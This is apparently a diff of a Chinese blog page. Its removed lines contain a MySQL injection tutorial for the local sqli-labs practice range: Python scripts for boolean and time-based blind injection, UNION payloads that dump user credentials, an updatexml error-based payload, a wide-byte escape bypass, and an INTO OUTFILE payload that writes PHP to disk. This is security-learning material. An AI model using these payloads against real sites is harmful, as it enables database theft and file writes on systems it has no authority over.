-<p>python脚本如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">def database_len():</span><br><span class="line">    for i in range(9999):</span><br><span class="line">        url&#x3D;&#39;&#39;&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-8&#x2F;&#39;&#39;&#39;</span><br><span class="line">        payload&#x3D;&#39;&#39;&#39;?id&#x3D;1&#39; and length(database())&gt;%s&#39;&#39;&#39; %i</span><br><span class="line">        #print(url+payload+&#39; --+ &#39;)</span><br><span class="line">        r&#x3D;requests.get(url+payload+&#39; --+ &#39;)</span><br><span class="line">        if &#39;You are in&#39; in r.text:</span><br><span class="line">            print(i)</span><br><span class="line">        else:</span><br><span class="line">            print(&#39;database_length:&#39;,i)</span><br><span class="line">            break</span><br><span class="line">database_len()</span><br><span class="line">def database_name():</span><br><span class="line">    databasename&#x3D;&#39;&#39;</span><br><span class="line">    for i in range(1,9):</span><br><span class="line">        for j in &#39;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#39;:</span><br><span class="line">            url&#x3D;&#39;&#39;&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-8&#x2F;&#39;&#39;&#39;</span><br><span class="line">            payload&#x3D;&#39;&#39;&#39;?id&#x3D;1&#39; and substr(database(),%d,1) &#x3D; &#39;%s&#39; &#39;&#39;&#39; %(i,j)</span><br><span class="line">            #print(url+payload+&#39; --+ &#39;)</span><br><span class="line">            r&#x3D;requests.get(url+payload+&#39; --+ &#39;)</span><br><span class="line">            if &#39;You are in&#39; in r.text:</span><br><span class="line">                databasename +&#x3D; j</span><br><span class="line">                print(databasename)</span><br><span class="line">                break</span><br><span class="line">    print(&quot;database_name:&quot;,databasename.lower())</span><br><span class="line">database_name()</span><br><span class="line">def table_length():</span><br><span class="line">        for j in range(9999):</span><br><span class="line">            url&#x3D;&#39;&#39;&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-8&#x2F;&#39;&#39;&#39;</span><br><span class="line">            payload&#x3D;&#39;&#39;&#39;?id&#x3D;1&#39; and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&gt;%s&#39;&#39;&#39; %j</span><br><span class="line">            r&#x3D;requests.get(url+payload+&#39; --+ &#39;)</span><br><span class="line">            if &#39;You are in&#39; in r.text:</span><br><span class="line">                print(j)</span><br><span class="line">            else:</span><br><span class="line">                print(&#39;firs table length:&#39;,j)</span><br><span class="line">                break</span><br><span class="line">table_length()</span><br></pre></td></tr></table></figure>
-<p>我只写了猜测当前数据库的长度，数据库名，第一张表的长度。剩下的都一样这里不在给出！</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">布尔盲注参考：</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_41554179&#x2F;article&#x2F;details&#x2F;88414079</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;Wu000999&#x2F;article&#x2F;details&#x2F;100041049</span><br></pre></td></tr></table></figure>
-<h2 id="四-无可显字段无错误提示，正确错误没有明显区别"><a href="#四-无可显字段无错误提示，正确错误没有明显区别" class="headerlink" title="四.无可显字段无错误提示，正确错误没有明显区别"></a>四.无可显字段无错误提示，正确错误没有明显区别</h2><p>这类的sql注入类型，可以利用的方式是时间盲注。<br>时间盲注又叫延迟注入，通过时间长短来判断是否执行成功。<br>用到函数和布尔盲注差不多。<br>if(条件，1，2) 如果条件满足，则执行1，不满足就执行2<br>sleep(2) 延迟2秒钟<br>用到的语句就多了上面两条<br>注入语句：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">if((ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt;11),sleep(2),1) --+</span><br><span class="line">if((ascii(substr((select column_name from information_schema.tables where table_name&#x3D;‘users’ limit 0,1),1,1))&gt;11),sleep(2),1) --+</span><br><span class="line"> if((ascii(substr((select username from users limit 0,1),1,1))&gt;11),sleep(2),1) --+</span><br></pre></td></tr></table></figure>
-<p>根据上面的语句构造python脚本：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import datetime</span><br><span class="line">import time</span><br><span class="line">def database_len():</span><br><span class="line">    for i in range(1,10):</span><br><span class="line">        url&#x3D;&#39;&#39;&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-9&#x2F;&#39;&#39;&#39;</span><br><span class="line">        payload&#x3D;&#39;&#39;&#39;?id&#x3D;1&#39; and if(length(database())&#x3D;%d,sleep(2),1)&#39;&#39;&#39; %i</span><br><span class="line">        #print(url+payload+&#39; --+ &#39;)</span><br><span class="line">        time1&#x3D;datetime.datetime.now()</span><br><span class="line">        r&#x3D;requests.get(url+payload+&#39; --+ &#39;)</span><br><span class="line">        time2&#x3D;datetime.datetime.now()</span><br><span class="line">        l&#x3D;(time2-time1).seconds</span><br><span class="line">        if l&gt;&#x3D;2:</span><br><span class="line">            print(&#39;database_len:&#39;,i)</span><br><span class="line">            break</span><br><span class="line">        #else:</span><br><span class="line">        #    print(i)</span><br><span class="line">        #    break</span><br><span class="line">database_len()</span><br><span class="line">def database_name():</span><br><span class="line">    name &#x3D; &#39;&#39;</span><br><span class="line">    for j in range(1, 9):</span><br><span class="line">        for i in &#39;0123456789abcdefghijklmnopqrstuvwxyz&#39;:</span><br><span class="line">            url &#x3D; &#39;&#39;&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-9&#x2F;&#39;&#39;&#39;</span><br><span class="line">            payload &#x3D; &#39;&#39;&#39;?id&#x3D;1&#39; and if(substr(database(),%d,1)&#x3D;&#39;%s&#39;,sleep(2),1)&#39;&#39;&#39; % (j,i)</span><br><span class="line">            time1 &#x3D; datetime.datetime.now()</span><br><span class="line">            r &#x3D; requests.get(url + payload + &#39; --+ &#39;)</span><br><span class="line">            time2 &#x3D; datetime.datetime.now()</span><br><span class="line">            sec &#x3D; (time2 - time1).seconds</span><br><span class="line">            if sec &gt;&#x3D; 2:</span><br><span class="line">                name +&#x3D; i</span><br><span class="line">                print(name)</span><br><span class="line">                break</span><br><span class="line">    print(&#39;database_name:&#39;, name)</span><br><span class="line">database_name()</span><br></pre></td></tr></table></figure>
-<p>这个脚本中猜解了数据库的长度和名称，其他的猜解和这个基本一致。</p>
-<h2 id="五-post注入"><a href="#五-post注入" class="headerlink" title="五.post注入"></a>五.post注入</h2><p>post注入其实就是注入位置的不同，其他的注入利用方式和前面的基本一致。<br>主要是用到Burp Suite 进行抓包<br>我们以sqli-labs第11关为例：<br>用的注入语句：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#39; and 1&#x3D;1 %23</span><br><span class="line">&#39; order by 2 %23</span><br><span class="line">&#39; union select 1,2 %23</span><br><span class="line">&#39; union select database(),user() %23</span><br><span class="line">&#39; union select group_concat(table_name),2 from information_schema.tables where table_schema&#x3D;database() %23</span><br><span class="line">&#39; union select group_concat(column_name),2 from information_schema.columns where table_name&#x3D;&#39;users&#39; %23</span><br><span class="line">&#39; union select username,password from users limit 0,1%23</span><br></pre></td></tr></table></figure>
-<p>用burp抓包 发送到repeated模块</p>
-
-<p>加个单引号爆出错误</p>
-<img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/1.png" class title="This is an test image">
-<p>判断字段数</p>
-<img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/2.png" class title="This is an test image">
-<p>判断可显字段</p>
-<img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/3.png" class title="This is an test image">
-<p>爆出数据库的表名</p>
-<img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/4.png" class title="This is an test image">
-<p>爆字段名</p>
-<img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/5.png" class title="This is an test image">
-<p>爆字段的内容</p>
-<img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/6.png" class title="This is an test image">
-
-<p>这里指举了一个很简单的例子，还有很多注入 其实post注入和get注入利用方式是一样的<br>只不过是注入位置的不同。</p>
-<h2 id="六-insert，delete，update注入"><a href="#六-insert，delete，update注入" class="headerlink" title="六.insert，delete，update注入"></a>六.insert，delete，update注入</h2><p>这些注入基本利用方式和上面的一样，只是注入位置的差别。<br>insert语句用于向数据库插入数据-&gt;一般用在用户注册中，<br>delete语句用于删除数据库的数据-&gt;比如删除留言板的数据<br>update语句用于更新数据库的数据-&gt;比如修改用户信息</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">insert into users(id,username,passowrd) values (2,&#39;&#39;1&#39;&#39;,&#39;Da4er);</span><br><span class="line"></span><br><span class="line">UPDATE 表名称 SET 列名称 &#x3D; 新值 WHERE 列名称 &#x3D; 某值</span><br><span class="line"></span><br><span class="line">DELETE FROM 表名称 WHERE 列名称 &#x3D; 值</span><br></pre></td></tr></table></figure>
-<p>这类的注入不在给出例子 ，向这三个类型的注入更多的是配合报错提示进行注入<br>参考文章：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;babers&#x2F;articles&#x2F;7252401.html</span><br></pre></td></tr></table></figure>
-<p>这个可以做一下sqli-labs第十七关的update注入</p>
-<h2 id="七-http头注入"><a href="#七-http头注入" class="headerlink" title="七.http头注入"></a>七.http头注入</h2><p>http头注入本质还是注入位置的不同<br>在有些应用中http头的信息会回显到浏览器，这个时候可以尝试一下http头注入，注入利用的方式和get类型的一样<br>我们来以sqli-labs第18关注入user-agent头为例：<br>配合报错注入来进行注入：</p>
-<img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/7.png" class title="This is an test image">
-<img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/8.png" class title="This is an test image">
-<img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/9.png" class title="This is an test image">
-
-<h2 id="八-数字型，字符型，搜索型注入"><a href="#八-数字型，字符型，搜索型注入" class="headerlink" title="八.数字型，字符型，搜索型注入"></a>八.数字型，字符型，搜索型注入</h2><p>像这三类注入，是包含上面所有的注入利用方式的，这三类注入个大方面，意思是用户输入到服务器的参数是数字，字符串，还是搜索数据的。<br>所以这三类是整个sql注入大的方面，这里不在叙述。只对搜索型注入进行分析<br>搜索型注入主要用在搜索数据时，对搜索的参数过滤不全。<br>搜索型注入的构造和其他两类不太一样，一般的要加%，这是sql里的匹配查找<br>我们来看一下一个靶场搜索型注入的代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#39;submit&#39;]) &amp;&amp; $_GET[&#39;name&#39;]!&#x3D;null)&#123;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;这里没有做任何处理，直接拼到select里面去了</span><br><span class="line">    $name&#x3D;$_GET[&#39;name&#39;];</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;这里的变量是模糊匹配，需要考虑闭合</span><br><span class="line">    $query&#x3D;&quot;select username,id,email from member where username like &#39;%$name%&#39;&quot;;</span><br><span class="line">    $result&#x3D;execute($link, $query);</span><br><span class="line">    if(mysqli_num_rows($result)&gt;&#x3D;1)&#123;</span><br><span class="line">        $html2.&#x3D;&quot;&lt;p class&#x3D;&#39;notice&#39;&gt;用户名中含有&#123;$_GET[&#39;name&#39;]&#125;的结果如下：&lt;br &#x2F;&gt;&quot;;</span><br><span class="line">        while($data&#x3D;mysqli_fetch_assoc($result))&#123;</span><br><span class="line">            $uname&#x3D;$data[&#39;username&#39;];</span><br><span class="line">            $id&#x3D;$data[&#39;id&#39;];</span><br><span class="line">            $email&#x3D;$data[&#39;email&#39;];</span><br><span class="line">            $html1.&#x3D;&quot;&lt;p class&#x3D;&#39;notice&#39;&gt;username：&#123;$uname&#125;&lt;br &#x2F;&gt;uid:&#123;$id&#125; &lt;br &#x2F;&gt;email is: &#123;$email&#125;&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line"></span><br><span class="line">        $html1.&#x3D;&quot;&lt;p class&#x3D;&#39;notice&#39;&gt;0o。..没有搜索到你输入的信息！&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>我们可以看到输入的name 被’%name%’包围，这就是搜索型注入的构造方式</p>
-<img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/1.png" class title="This is an test image">
-<p>构造的payload：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ko%&#39; and updatexml(0x7e,concat(0x7e,version(),0x7e),0x7e) or &#39;%</span><br></pre></td></tr></table></figure>
-<p>这里只爆出数据库版本，其他的就不在这里操作了，思路都是一样，利用报错注入。</p>
-<h2 id="九-宽字节注入"><a href="#九-宽字节注入" class="headerlink" title="九.宽字节注入"></a>九.宽字节注入</h2><p>宽字节注入是一种特殊的注入方式，其利用的思路和前面写的一样，只不过宽字节注入能绕过将单引号等特殊字符转义。<br>原因是：网站用了utf-8编码，而数据库使用了GBK编码<br>宽字节（两字节）带来的安全问题主要是吃ASCII字符（一字节）的现象，使用一些特殊字符来”吃掉“经过转义符 “ \ ” 。<br>GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节<br>mysql中用的转义函数：addslashes、mysql_real_escape_string、mysql_escape_string以及后面在高版本被去除的magic_quote_gpc<br>以sqli第三十三关为例：</p>
-<img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/2.png" class title="This is an test image">
-<img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/3.png" class title="This is an test image">
-<img src="/Mysql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/4.png" class title="This is an test image">
-<p>发现可以运用宽字节注入，绕过防御措施。<br>宽字节注入现在很少见了。<br>这里只给出了爆当前数据库名的语句，其他的注入语句和上面写的报错注入一样。宽字节注入说白了就是绕过sql防御的一种收到，因为比较经典才会单拿出来提一下。</p>
-<h2 id="十-Mysql注入的高级利用"><a href="#十-Mysql注入的高级利用" class="headerlink" title="十.Mysql注入的高级利用"></a>十.Mysql注入的高级利用</h2><p>这部分主要是如果我们的权限足够大，可以向网站写文件或读文件<br>主要用到俩个语句：into outfile 和 load_file()</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;)) UNION SELECT 1,&#39;&lt;?php echo &quot;Da4er&quot;?&gt;&#39;,3 into outfile &#39;D:\1.txt&#39; --+</span><br></pre></td></tr></table></figure>
-<p>into outfile是向本地写文件的操作<br>load_file()是读本地文件的操作</p>
-<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>明天还会在写一篇sqlmap的使用教程，然后这个学期学安全的时间到此结束了，安心准备期末了~</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2380,7 +2251,7 @@
               
                 <a href="/archives%7C%7C%20archive">
               
-                  <span class="site-state-item-count">45</span>
+                  <span class="site-state-item-count">46</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2497,7 +2368,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">35k</span>
+    <span title="Site words total count">35.5k</span>
   
 </div>
 
@@ -2507,7 +2378,7 @@
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共35k字</span>
+  <span class="post-count">博客全站共35.5k字</span>
 </div>
 
 
